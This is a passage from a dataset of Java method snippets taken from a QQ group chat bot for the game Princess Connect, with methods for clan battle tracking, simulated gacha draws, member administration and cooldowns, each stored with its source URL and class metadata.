\"\u8fd8\u6ca1\u6709\u5f00\u542f\u5de5\u4f1a\u6218\u60f9\");        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getTree", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getTree(GroupMsg msg, MsgSender sender){        switch (DB.Instance.trueTree(msg.getQQCode(),msg.getGroupCode())){            case -1:                sender.SENDER.sendGroupMsg(msg.getGroupCode(), error);                break;            case 1:                sender.SENDER.sendGroupMsg(msg.getGroupCode(), noInDataBase);                break;            case 2:                sender.SENDER.sendGroupMsg(msg.getGroupCode(), isTree);                break;            case 3:                sender.SENDER.sendGroupMsg(msg.getGroupCode(), notInTree);                break;        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "outKnife", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void outKnife(GroupMsg msg, MsgSender sender){        StringBuilder stringBuilder=new StringBuilder();        FightStatue fightStatue=DB.Instance.searchFightStatue(msg.getQQCode());        if(fightStatue!=null) {//\u6ca1\u6709\u5de5\u4f1aboss\u8fdb\u5ea6\u6570\u636e            try {                if (fightStatue.getStartTime().compareTo(new SimpleDateFormat(dateFormat).format(new Date())) <= 0) { //\u65f6\u95f4\u82e5\u5df2\u8fc7\u5f00\u59cb\u5219\u53ef\u4ee5\u4e0a\u62a5\u4f24\u5bb3                    DB.Instance.hurtfight(msg.getQQCode(), getHurt(msg.getMsg(), 1), sender);                    fightStatue = DB.Instance.searchFightStatue(msg.getQQCode());                    stringBuilder.append(\"\u73b0\u5728boss\u72b6\u6001\\n\u5468\u76ee:\").append(fightStatue.getLoop()).append(\"\\n\").append(fightStatue.getSerial()).append(\"\u738b\\n\");                    if (fightStatue.getRemnant() == -1) {                        stringBuilder.append(\"\u8840\u91cf\uff1a\u672a\u5f55\u5165\");                    } else {                        stringBuilder.append(\"\u8840\u91cf\uff1a\").append(fightStatue.getRemnant());                    }                } else {                    stringBuilder.append(\"\u4f1a\u6218\u5373\u5c06\u5f00\u59cb\uff0c\u8fd8\u6ca1\u6709\u5230\u6253boss\u7684\u65f6\u5019\u54e6\");                }                sender.SENDER.sendGroupMsg(msg.getGroupCode(), stringBuilder.toString());            } catch (NumberFormatException e) {                e.printStackTrace();                sender.SENDER.sendGroupMsg(msg.getGroupCode(), commandError);            }        }else {            sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"\u8fd8\u6ca1\u5f00\u59cb\u4e3a\u4ec0\u4e48\u5c31\u4ea4\u5200\u60f9\");        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "endFight", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void endFight(GroupMsg msg, MsgSender sender) {        int i = DB.Instance.endFight(msg.getGroupCode(), msg.getQQCode());        switch (i) {            case -1:                sender.SENDER.sendGroupMsg(msg.getGroupCode(), error);                break;            case 0://\u6570\u636e\u5e93\u79bb\u8fd8\u6ca1\u5efa\u8fd9\u4e2a\u5de5\u4f1a\u6216\u8005\u6ca1\u8fd9\u6743\u9650                sender.SENDER.sendGroupMsg(msg.getGroupCode(), notPower);                break;            case 1://\u6210\u529f\u7ed3\u675f                sender.SENDER.sendGroupMsg(msg.getGroupCode(), SuccessEndFight);                break;            case 2://\u4f1a\u6218\u6ca1\u5f00\u542f                sender.SENDER.sendGroupMsg(msg.getGroupCode(), EngFightStartDouble);                break;        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "startFight", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void startFight(GroupMsg msg, MsgSender sender) {        String time = msg.getMsg().replaceAll(\" +\", \"\").substring(5);        int i = 0;        i = DB.Instance.startFight(msg.getGroupCode(), msg.getQQCode(), time);        switch (i) {            case -1:                sender.SENDER.sendGroupMsg(msg.getGroupCode(), error);                break;            case 0://\u6570\u636e\u5e93\u79bb\u8fd8\u6ca1\u5efa\u8fd9\u4e2a\u5de5\u4f1a\u6216\u8005\u6ca1\u8fd9\u6743\u9650                sender.SENDER.sendGroupMsg(msg.getGroupCode(), notPower);                break;            case 1://\u6210\u529f\u5f00\u59cb                sender.SENDER.sendGroupMsg(msg.getGroupCode(), SuccessStartFight);                break;            case 2://\u5df2\u7ecf\u5f00\u59cb                sender.SENDER.sendGroupMsg(msg.getGroupCode(), StartFightStartDouble);                break;            case 3:                sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"\u65e5\u671f\u683c\u5f0f\u9519\u8bef\uff0c\u793a\u4f8b  20:05:12\");                break;            case 4:                sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"\u6210\u529f\u9884\u7ea6\uff0c\u4f1a\u6218\u5373\u5c06\u5f00\u59cb\");                break;        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "Gashapon", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void Gashapon(GroupMsg msg, MsgSender sender) {        sender.SENDER.sendGroupMsg(msg.getGroupCode(), dp_UpGashapon(10));    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "Gashapon_", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void Gashapon_(GroupMsg msg, MsgSender sender) {        sender.SENDER.sendGroupMsg(msg.getGroupCode(), dp_Gashapon(10));    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "Gashapon__", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void Gashapon__(GroupMsg msg, MsgSender sender) {        if (isCool(msg.getQQCode())) {            sender.SENDER.sendGroupMsg(msg.getGroupCode(), dp_Gashapon(300));            reFlashCoolDown(msg.getQQCode());        } else {            sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"\u5728\u51b7\u5374\u4e2d\");        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "Gashapon___", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void Gashapon___(GroupMsg msg, MsgSender sender) {        if (isCool(msg.getQQCode())) {            sender.SENDER.sendGroupMsg(msg.getGroupCode(), dp_UpGashapon(300));            reFlashCoolDown(msg.getQQCode());        } else {            sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"\u5728\u51b7\u5374\u4e2d\");        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "Gashapon____", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void Gashapon____(GroupMsg msg, MsgSender sender) {        String str = msg.getMsg().replaceAll(\" +\", \"\");        int q = Integer.parseInt(str.substring(4));        sender.SENDER.sendGroupMsg(msg.getGroupCode(), dp_UpGashapon(q));    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "Gashapon_____", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void Gashapon_____(GroupMsg msg, MsgSender sender) {        String str = msg.getMsg().replaceAll(\" +\", \"\");        int q = Integer.parseInt(str.substring(2));        sender.SENDER.sendGroupMsg(msg.getGroupCode(), dp_Gashapon(q));    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "dp_Gashapon", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String dp_Gashapon(int num) {        Random random = new Random();        random.setSeed(new Date().getTime());        int on = 0, tw = 0, thre = 0;//\u62bd\u51fa\u6765\u7684\u4e09\u5fc3\u4e8c\u5fc3\u6709\u51e0\u4e2a        StringBuilder stringBuilder = new StringBuilder();        ArrayList<String> jues = new ArrayList<>();        for (int i = 0; i < num - num / 10; i++) {            int j = random.nextInt(1000);            if (j > 975) {                thre++;            } else if (j > 795) {                tw++;            } else {                on++;            }        }        for (int i = 0; i < num / 10; i++) {            int j = random.nextInt(1000);            if (j > 975) {                thre++;            } else {                tw++;            }        }        HashMap<String, Integer> map1 = new HashMap<>();        HashMap<String, Integer> map2 = new HashMap<>();        HashMap<String, Integer> map3 = new HashMap<>();        stringBuilder.append(\"\u4e00\u5171\u62bd\u51fa\u4e86\").append(thre).append(\"\u4e2a\u4e09\u661f\").append(tw).append(\"\u4e2a\u4e24\u661f\").append(on).append(\"\u4e2a\u4e00\u661f\\n\u4e09\u661f\u89d2\u8272:\");        for (int i = 0; i < thre; i++) {            int j = random.nextInt(Three.length);            if (map1.get(Three[j]) != null) {                map1.put(Three[j], map1.get(Three[j]) + 1);            } else {                map1.put(Three[j], 1);            }        }        for (int i = 0; i < tw; i++) {            int j = random.nextInt(two.length);            if (map2.get(two[j]) != null) {                map2.put(two[j], map2.get(two[j]) + 1);            } else {                map2.put(two[j], 1);            }        }        for (int i = 0; i < on; i++) {            int j = random.nextInt(one.length);            if (map3.get(one[j]) != null) {                map3.put(one[j], map3.get(one[j]) + 1);            } else {                map3.put(one[j], 1);            }        }        Set<String> set1 = map1.keySet();        Set<String> set2 = map2.keySet();        Set<String> set3 = map3.keySet();        for (String s : set1) {            stringBuilder.append(s).append(\"*\").append(map1.get(s)).append(\",\");        }        stringBuilder.append(\"\\n\u4e8c\u661f\u89d2\u8272\u6709\uff1a\");        for (String s : set2) {            stringBuilder.append(s).append(\"*\").append(map2.get(s)).append(\",\");        }        stringBuilder.append(\"\\n\u4e00\u661f\u89d2\u8272\u6709\uff1a\");        for (String s : set3) {            stringBuilder.append(s).append(\"*\").append(map3.get(s)).append(\",\");        }        return stringBuilder.toString();    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "kimo", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void kimo(GroupMsg msg, MsgSender sender) {        Random random = new Random();        random.setSeed(new Date().getTime());        sender.SENDER.sendGroupMsg(msg.getGroupCode(), kimo_Definde[random.nextInt(kimo_Definde.length)]);    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "qielu", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void qielu(GroupMsg msg, MsgSender sender) {        String needTran = msg.getMsg().replaceAll(\" +\", \"\");        if (needTran.length() > 2) {            needTran = needTran.substring(2);            byte[] bytes = needTran.getBytes();            StringBuilder tranled = new StringBuilder();            for (int i = 0; i < bytes.length; i++) {                int[] cache = spiltByte(bytes[i] < 0 ? -bytes[i] + 127 : bytes[i]);                tranled.append(QieLU[cache[0]]);                tranled.append(QieLU[cache[1]]);            }            sender.SENDER.sendGroupMsg(msg.getGroupCode(), tranled.toString());        } else {            sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"\u6ca1\u6709\u8981\u7ffb\u8bd1\u7684\u8bed\u53e5\u54ce\");        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "reqielu", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void reqielu(GroupMsg msg, MsgSender sender) {        String needTran = msg.getMsg().replaceAll(\" +\", \"\");        needTran = needTran.replaceAll(\",\", \"%%\");        needTran = needTran.replaceAll(\"\u6263\", \"\u6263\u6263\");        needTran = needTran.substring(4);        if (needTran.length() > 0) {            ArrayList<Byte> bytes = new ArrayList<Byte>();            //\u9632\u6b62\u524d\u9762\u548c\u6700\u540e\u51fa\u73b0\"\uff0c\"\u8fd9\u4e2a\u4e0d\u548c\u8c10\u56e0\u7d20            char[] cache = new char[2];            int q, w;            for (int i = 0; i < needTran.length(); i += 4) {                cache[0] = needTran.charAt(i + 2);                cache[1] = needTran.charAt(i + 3);                q = reQieLU.get(String.valueOf(cache));                cache[0] = needTran.charAt(i);                cache[1] = needTran.charAt(i + 1);                w = reQieLU.get(String.valueOf(cache));                bytes.add(respiltByte(q, w));            }            sender.SENDER.sendGroupMsg(msg.getGroupCode(), String.valueOf(getChars(bytes.toArray(new Byte[0]))));        } else {            sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"\u6ca1\u6709\u8981\u7ffb\u8bd1\u7684\u8bed\u53e5\u54ce\");        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "reName", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void reName(GroupMsg msg, MsgSender sender) {        String newName = msg.getMsg();        newName = newName.replaceAll(\" +\", \"\");        newName = newName.substring(2);        sender.SENDER.sendGroupMsg(msg.getGroupCode(), DB.Instance.changeName(msg.getQQCode(), newName));    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "reGroupName", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void reGroupName(GroupMsg msg, MsgSender sender) {        if (DB.Instance.powerCheck(msg.getQQCode(), msg.getGroupCode())) {            String newName = msg.getMsg();            newName = newName.replaceAll(\" +\", \"\");            newName = newName.substring(4);            sender.SENDER.sendGroupMsg(msg.getGroupCode(), DB.Instance.changeGroupName(msg.getGroupCode(), newName));        } else {            sender.SENDER.sendGroupMsg(msg.getGroupCode(), notPower);        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "GroupNameStatue", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void GroupNameStatue(GroupMsg msg, MsgSender sender) {        sender.SENDER.sendGroupMsg(msg.getGroupCode(), DB.Instance.groupStatue(msg.getGroupCode()));    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "GroupMemberList", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void GroupMemberList(GroupMsg msg, MsgSender sender) {        StringBuilder stringBuilder = new StringBuilder();        List<teamMember> teamMembers = DB.Instance.groupMemberList(msg.getGroupCode());        if (teamMembers != null) {            stringBuilder.append(\"\u5de5\u4f1a\u6210\u5458:\\n\");            for (teamMember teamMember : teamMembers) {                stringBuilder.append(\"qq\uff1a\").append(teamMember.getUserQQ());                stringBuilder.append(\"  \u6635\u79f0\uff1a\").append(teamMember.getName());                if (teamMember.isPower()) {                    stringBuilder.append(\"  \u662f\u7ba1\u7406\u5458\u54e6 \\n\");                } else {                    stringBuilder.append(\"\\n\");                }            }            sender.SENDER.sendGroupMsg(msg.getGroupCode(), stringBuilder.toString());            return;        } else {            stringBuilder.append(\"\u8fd8\u6ca1\u6709\u521b\u5efa\u5de5\u4f1a\u6216\u8005\u4e0d\u5728\u54e6\");            sender.SENDER.sendGroupMsg(msg.getGroupCode(), stringBuilder.toString());        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "dropKnife", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void dropKnife(GroupMsg msg, MsgSender sender) {        if (DB.Instance.powerCheck(msg.getQQCode(), msg.getGroupCode())) {            int id = Integer.valueOf(msg.getMsg().replaceAll(\" +\", \"\").substring(2));            if (DB.Instance.deleteKnife(id)) {                sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"\u64cd\u4f5c\u6210\u529f\");            }        } else {            sender.SENDER.sendGroupMsg(msg.getGroupCode(), notPower);        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "changeBoss", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void changeBoss(GroupMsg msg, MsgSender sender) {        if (DB.Instance.powerCheck(msg.getQQCode(), msg.getGroupCode())) {            String[] change = msg.getMsg().replaceAll(\" +\", \" \").split(\" \");            boolean is = DB.Instance.changeBoss(msg.getGroupCode(), Integer.valueOf(change[1]), Integer.valueOf(change[2]), Integer.valueOf(change[3]));            if (is) {                sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"boss\u8c03\u6574\u6210\u529f\");            } else {                sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"\u53d8\u66f4\u4e86\u5468\u76ee\uff0c\u5c06\u8fd8\u5728\u51fa\u5200\u7684\u4eba\u5168\u90e8\u4e0b\u6811\");            }        } else {            sender.SENDER.sendGroupMsg(msg.getGroupCode(), notPower);        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "sideKnife", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sideKnife(GroupMsg msg, MsgSender sender) {        if (DB.Instance.powerCheck(msg.getQQCode(), msg.getGroupCode())) {            CQCodeUtil cqCodeUtil = CQCodeUtil.build();            List<String> strings = cqCodeUtil.getCQCodeStrFromMsgByType(msg.getMsg(), CQCodeTypes.at);            DB.Instance.hurtfight(strings.get(0).substring(10, strings.get(0).length() - 1), getHurt(msg.getMsg(), 2), sender);        } else {            sender.SENDER.sendGroupMsg(msg.getGroupCode(), notPower);        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "dp_UpGashapon", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String dp_UpGashapon(int num) {        Random random = new Random();        random.setSeed(new Date().getTime());        int on = 0, tw = 0, thre = 0;//\u62bd\u51fa\u6765\u7684\u4e09\u5fc3\u4e8c\u5fc3\u6709\u51e0\u4e2a        StringBuilder stringBuilder = new StringBuilder();        for (int i = 0; i < num - num / 10; i++) {            int j = random.nextInt(1000);            if (j > 975) {                thre++;            } else if (j > 795) {                tw++;            } else {                on++;            }        }        for (int i = 0; i < num / 10; i++) {            int j = random.nextInt(1000);            if (j > 975) {                thre++;            } else {                tw++;            }        }        stringBuilder.append(\"\u4e00\u5171\u62bd\u51fa\u4e86\").append(thre).append(\"\u4e2a\u4e09\u661f\").append(tw).append(\"\u4e2a\u4e24\u661f\").append(on).append(\"\u4e2a\u4e00\u661f\\n\u4e09\u661f\u89d2\u8272:\");        HashMap<String, Integer> map1 = new HashMap<>();        HashMap<String, Integer> map2 = new HashMap<>();        HashMap<String, Integer> map3 = new HashMap<>();        stringBuilder.append(\"\u4e00\u5171\u62bd\u51fa\u4e86\").append(thre).append(\"\u4e2a\u4e09\u661f\").append(tw).append(\"\u4e2a\u4e24\u661f\").append(on).append(\"\u4e2a\u4e00\u661f\\n\u4e09\u661f\u89d2\u8272:\");        for (int i = 0; i < thre; i++) {            int j = random.nextInt(Three.length);            if (map1.get(Three[j]) != null) {                map1.put(Three[j], map1.get(Three[j]) + 1);            } else {                map1.put(Three[j], 1);            }        }        for (int i = 0; i < tw; i++) {            int j = random.nextInt(two.length);            if (map2.get(two[j]) != null) {                map2.put(two[j], map2.get(two[j]) + 1);            } else {                map2.put(two[j], 1);            }        }        for (int i = 0; i < on; i++) {            int j = random.nextInt(one.length);            if (map3.get(one[j]) != null) {                map3.put(one[j], map3.get(one[j]) + 1);            } else {                map3.put(one[j], 1);            }        }        Set<String> set1 = map1.keySet();        Set<String> set2 = map2.keySet();        Set<String> set3 = map3.keySet();        for (String s : set1) {            stringBuilder.append(s).append(\"*\").append(map1.get(s)).append(\",\");        }        stringBuilder.append(\"\\n\u4e8c\u661f\u89d2\u8272\u6709\uff1a\");        for (String s : set2) {            stringBuilder.append(s).append(\"*\").append(map2.get(s)).append(\",\");        }        stringBuilder.append(\"\\n\u4e00\u661f\u89d2\u8272\u6709\uff1a\");        for (String s : set3) {            stringBuilder.append(s).append(\"*\").append(map3.get(s)).append(\",\");        }        return stringBuilder.toString();    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setAdmin", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAdmin(GroupMsg msg, MsgSender sender) {        CQCodeUtil cqCodeUtil = CQCodeUtil.build();        List<String> strings = cqCodeUtil.getCQCodeStrFromMsgByType(msg.getMsg(), CQCodeTypes.at);        if (DB.Instance.powerCheck(msg.getQQCode(), msg.getGroupCode())) {            switch (DB.Instance.setAdmin(strings.get(0).substring(10, strings.get(0).length() - 1), msg.getGroupCode())) {                case 0:                    sender.SENDER.sendGroupMsg(msg.getGroupCode(), noFindTheOne);                    break;                default:                    sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"\u6210\u529f\u8bbe\u7f6e\u7ba1\u7406\u5458\");                    break;            }        } else {            sender.SENDER.sendGroupMsg(msg.getGroupCode(), notPower);        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "kickman", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void kickman(GroupMsg msg, MsgSender sender) {        int num;        if (DB.Instance.powerCheck(msg.getQQCode(), msg.getGroupCode())) {            CQCodeUtil cqCodeUtil = CQCodeUtil.build();            List<String> strings = cqCodeUtil.getCQCodeStrFromMsgByType(msg.getMsg(), CQCodeTypes.at);            num = DB.getInstance().deleteMember(strings.get(0).substring(10, strings.get(0).length() - 1));            if (num == 0) {                sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"\u6ca1\u6709\u8e22\u6389\u4efb\u4f55\u4e00\u4e2a\u4eba\uff0c@\u7684\u8fd9\u4e2a\u4eba\u662f\u4e0d\u662f\u8fd8\u6ca1\u6709\u52a0\u5165\u8fd9\u4e2a\u5de5\u4f1a\u5462\");            } else {                sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"\u6210\u529f\u8e22\u6389\u4e86\");            }        } else {            sender.SENDER.sendGroupMsg(msg.getGroupCode(), notPower);        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "searchTree", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void searchTree(GroupMsg msg, MsgSender sender) {        List<String> trees = DB.Instance.searchTree(msg.getGroupCode());        if (trees.size() == 0) {            sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"\u65e0 \u4eba \u6302 \u6811\");        } else {            StringBuilder stringBuilder = new StringBuilder(\"\u6302\u6811\u540d\u5355:\");            for (String QQ : trees) {                stringBuilder.append(\"\\n[CQ:at,qq=\").append(QQ).append(\"] \").append(DB.Instance.searchName(QQ));            }            sender.SENDER.sendGroupMsg(msg.getGroupCode(), stringBuilder.toString());        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "searchOutKnife", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void searchOutKnife(GroupMsg msg, MsgSender sender) {        List<String> trees = DB.Instance.searchOutKnife(msg.getGroupCode());        if (trees.size() == 0) {            sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"\u65e0 \u4eba \u51fa \u5200\");        } else {            StringBuilder stringBuilder = new StringBuilder(\"\u51fa\u5200\u540d\u5355:\");            for (String QQ : trees) {                stringBuilder.append(\"\\n[CQ:at,qq=\").append(QQ).append(\"] \").append(DB.Instance.searchName(QQ));            }            sender.SENDER.sendGroupMsg(msg.getGroupCode(), stringBuilder.toString());        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getBoss", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getBoss(GroupMsg msg, MsgSender sender) {        FightStatue fightStatue = DB.Instance.getFightStatue(msg.getGroupCode());        if (fightStatue != null) {            sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"\u73b0\u5728\u4e3a \" + fightStatue.getLoop() + \"\u5468\u76ee\\n\" + fightStatue.getSerial() + \"\u738b\\n\u5269\u4f59\u8840\u91cf\uff1a\"                    + fightStatue.getRemnant() + \"\");        } else {            sender.SENDER.sendGroupMsg(msg.getGroupCode(), notBossOrNotDate);        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "reFlashCoolDown", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void reFlashCoolDown(String QQ) {        LocalDateTime localDateTime = LocalDateTime.now();        localDateTime.plusMinutes(2);        DateTimeFormatter dateTimeFormatter = DateTimeFormatter.ofPattern(\"HH:mm\");        String time = localDateTime.format(dateTimeFormatter);        if (coolDown == null) {            coolDown = new HashMap<>();            coolDown.put(QQ, time);        } else {            coolDown.put(QQ, time);        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isCool", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isCool(String QQ) {        if (coolDown == 